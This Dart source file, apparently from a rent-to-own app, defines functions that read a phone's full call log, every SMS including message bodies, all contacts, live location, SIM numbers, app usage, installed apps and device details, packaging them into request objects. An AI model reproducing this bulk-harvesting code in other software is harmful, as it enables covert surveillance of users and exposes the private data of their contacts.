import 'dart:io';
import 'package:android_id/android_id.dart';
import 'package:app_usage/app_usage.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:call_log/call_log.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:fast_contacts/fast_contacts.dart';
import 'package:flutter/services.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:geolocator/geolocator.dart';
import 'package:installed_apps/app_info.dart';
import 'package:installed_apps/installed_apps.dart';
import 'package:mobile_number/mobile_number.dart';
import 'package:rent2ownwelcomeapp/src/core/core.dart';

class AppDeviceInfo {
  // - IMEI - //
  Future<String> getImei() async {
    String? imei;
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    if (Platform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      imei = '${androidInfo.id} | ${androidInfo.brand} | ${androidInfo.model}';
    }
    return imei!;
  }

  Future<String> getAndroidId() async {
    String? androidId; // Initialize the variable

    DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
    try {
      if (Platform.isAndroid) {
        // var build = await deviceInfoPlugin.androidInfo;
        // androidId = build.androidId.toString();
        var androidIdPlugin = const AndroidId();
        androidId = await androidIdPlugin.getId(); // Get the Android ID
      } else if (Platform.isIOS) {
        var data = await deviceInfoPlugin.iosInfo;
        androidId = data.identifierForVendor.toString();
        ; // On iOS, you can get the identifierForVendor as a unique ID
      }
    } on PlatformException {
      // Handle any exceptions, such as permission errors or unavailable data
      androidId = "Unknown"; // Set a default value in case of error
    }

    return androidId!; // Return only the Android ID
  }

  // - CALL LOGS - //
  Future<List<CallLogRequest>> getCallLogs() async {
    final Iterable<CallLogEntry> cLog = await CallLog.get();
    List<CallLogRequest> callLogs = [];
    for (CallLogEntry entry in cLog) {
      CallLogRequest data = CallLogRequest(
          name: '${entry.name}',
          date: '${DateTime.fromMillisecondsSinceEpoch(entry.timestamp!)}',
          phoneNo: '${entry.number}',
          duration: entry.duration!.toString(),
          callType: '${entry.callType?.name}',
          simDisplayName: '${entry.simDisplayName}');
      callLogs.add(data);
    }
    return callLogs;
  }

  // - SMS LOGS - //
  Future<List<SmsLogRequest>> getSmsLogs() async {
    List<SmsLogRequest> smsLogs = [];

    List<SmsMessage> smsMessages = await SmsQuery().getAllSms;
    for (SmsMessage item in smsMessages) {
      DateTime? dateTime = item.date != null
          ? DateTime.fromMillisecondsSinceEpoch(
              item.date!.millisecondsSinceEpoch)
          : null;

      // Format the DateTime as a string or store the raw DateTime object
      String formattedDate = dateTime?.toIso8601String() ?? "Unknown Date";

      if (item.kind == SmsMessageKind.sent) {
        SmsLogRequest smsLog = SmsLogRequest(
            status: "SENT",
            sender: "",
            receiver: '${item.sender!}',
            message: item.body!,
            date: formattedDate);
        smsLogs.add(smsLog);
      } else {
        SmsLogRequest smsLog = SmsLogRequest(
            status: "RECEIVED",
            sender: '${item.sender!}',
            receiver: "",
            message: item.body!,
            date: formattedDate);
        smsLogs.add(smsLog);
      }
    }
    ;
    return smsLogs;
  }

  // - CONTACTS - //
  Future<List<ContactRequest>> getContacts() async {
    List<ContactRequest> diContacts = [];
    List<Contact> contacts = await FastContacts.getAllContacts();

    for (Contact contact in contacts) {
      if (contact.phones.isNotEmpty) {
        var phones = contact.phones.map((e) => e.number).join(', ');
        final emails = contact.emails.map((e) => e.address).join(', ');
        final name = contact.structuredName;

        ContactRequest storeConst = ContactRequest(
          displayName: contact.displayName,
          firstName: name!.namePrefix,
          lastName: name.nameSuffix,
          phoneNo: phones,
          email: emails,
        );
        diContacts.add(storeConst);
      }
    }
    return diContacts;
  }

  // - LIVE LOCATION - //
  Future<LiveLocationRequest> getLocation() async {
    final position = await GeolocatorPlatform.instance.getCurrentPosition();

    LiveLocationRequest liveLocation = LiveLocationRequest(
        latitude: position.latitude.toString(),
        longitude: position.longitude.toString());
    return liveLocation;
  }

  // - SIM CARD - //
  Future<DeviceSimRequest> getSimCards(String phoneNo) async {
    List<SimCard>? simCards = [];
    simCards = await MobileNumber.getSimCards;
    String? simCard_1 = simCards!.length == 1 ? simCards[0].number : null;
    String? simCard_2 = simCards.length == 2 ? simCards[1].number : null;

    DeviceSimRequest simCard = DeviceSimRequest(
        simCardNo1: phoneNo, simCardNo2: simCard_1 ?? simCard_2 ?? "");
    return simCard;
  }

  // - USAGE STATS - //
  Future<List<AppUsageRequest>> getUsageStats() async {
    // grant usage permission - opens Usage Settings
    // await UsageStats.grantUsagePermission();
    List<AppUsageRequest>? temp = [];
    try {
      DateTime endDate = DateTime.now();
      DateTime startDate = endDate.subtract(const Duration(days: 100));
      List<AppUsageInfo> infoList =
          await AppUsage().getAppUsage(startDate, endDate);

      for (var info in infoList) {
        String appName = info.appName;

        if (info.packageName.contains("com.ss.android.ugc.trill")) {
          appName = "TikTok";
        } else if (info.packageName.contains("org.telegram.messenger")) {
          appName = "Telegram";
        } else if (info.packageName.contains("com.facebook.katana")) {
          appName = "Facebook";
        } else if (info.packageName.contains("com.facebook.orca")) {
          appName = "Messenger";
        } else if (info.packageName.contains("com.viber.voip")) {
          appName = "Viber";
        }

        String packageName = info.packageName;
        String fromDate = info.startDate.toString();
        String toDate = info.endDate.toString();
        String usage = info.usage.toString();
        String appdetail = "$appName($packageName)";
        temp.add(AppUsageRequest(
          appName: appdetail,
          duration: usage,
          timeFrom: fromDate,
          timeTo: toDate,
        ));
      }
    } on AppUsageException catch (exception) {
      AppLogger.e("AppUsageException : $exception");
    }
    return temp;
  }

  // - CALL FREQUENCY - //
  Future<List<CallFrequencyRequest>> getCallDurationNFrequency() async {
    final callLogEntries = await CallLog.query();
    List<String> phoneNumbers = [];
    List<CallFrequencyRequest> tempDataList = [];

    for (CallLogEntry entry in callLogEntries) {
      phoneNumbers.add(entry.number!);
    }

    phoneNumbers = phoneNumbers.toSet().toList();

    for (String phone in phoneNumbers) {
      tempDataList.add(
        CallFrequencyRequest(
            phoneNo: phone,
            frequency: callLogEntries
                .where((e) => e.number == phone)
                .length
                .toString()),
      );
    }
    return tempDataList;
  }

  // - SMS FREQUENCY - //
  Future<List<SmsFrequencyRequest>> getTextMessageFrequency() async {
    List<SmsMessage> smsMessages = await SmsQuery()
        .querySms(kinds: [SmsQueryKind.inbox, SmsQueryKind.sent]);

    List<String> phoneNums = [];
    List<SmsFrequencyRequest> tempDataList = [];

    for (SmsMessage msg in smsMessages) {
      phoneNums.add(msg.sender.toString());
    }

    phoneNums = phoneNums.toSet().toList();

    for (String phone in phoneNums) {
      tempDataList.add(SmsFrequencyRequest(
          phoneNo: phone,
          sendFrequency:
              "${smsMessages.where((e) => e.sender == phone && e.kind == SmsMessageKind.sent).length}",
          receivedFrequency:
              "${smsMessages.where((e) => e.sender == phone && e.kind == SmsMessageKind.received).length}"));
    }
    return tempDataList;
  }

  // - APP DOWNLOAD HISTORY - //
  Future<List<AppHistoryRequest>> getInstalledApps() async {
    List<AppInfo> installApps = await InstalledApps.getInstalledApps();

    List<AppHistoryRequest> tempDataList = [];

    for (AppInfo info in installApps) {
      tempDataList.add(AppHistoryRequest(
        packageName: info.packageName,
        appName: info.name,
        version: "${info.versionName}(${info.versionCode})",
      ));
    }

    return tempDataList;
  }

  // - DEVICE INFO - //
  Future<DeviceInfoRequest> getDeviceIdAndInfo() async {
    DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
    Battery battery = Battery();

    String deviceType = '';
    String brand = '';
    String operationSystemVersion = '';
    String deviceid = '';

    final appsInstalledCount =
        await InstalledApps.getInstalledApps().then((e) => e.length);

    final batteryLevel = await battery.batteryLevel;
    final batteryState =
        await battery.batteryState.then((e) => e.name.toUpperCase()); // EE

    try {
      if (Platform.isAndroid) {
        var build = await deviceInfoPlugin.androidInfo;
        AppLogger.i('Android Platform : $build');

        deviceid = build.id.toString();
        //deviceName = build.model;
        deviceType = "Android";
        brand = build.brand;

        operationSystemVersion =
            "Android ${build.version.release} (SDK ${build.version.sdkInt}), ${build.manufacturer} ${build.model}";
      } else if (Platform.isIOS) {
        var build = await deviceInfoPlugin.iosInfo;
        AppLogger.i('IOS Platform : $build');

        deviceid = build.identifierForVendor.toString();
        // deviceName = build.name;
        deviceType = "iOS";
        brand = build.utsname.machine;

        operationSystemVersion =
            "${build.systemName} ${build.systemVersion}, ${build.name} ${build.model}";
      }
    } on PlatformException catch (exception) {
      AppLogger.e("Platform Exception: $exception");
    }

    DeviceInfoRequest deviceInfo = DeviceInfoRequest(
      deviceId: deviceid,
      deviceType: deviceType,
      brand: brand,
      operationSystemVersion: operationSystemVersion,
      noOfAppsInstalled: '$appsInstalledCount',
      batteryState: batteryState,
      batteryLevel: '$batteryLevel %',
    );

    return deviceInfo;
  }
}
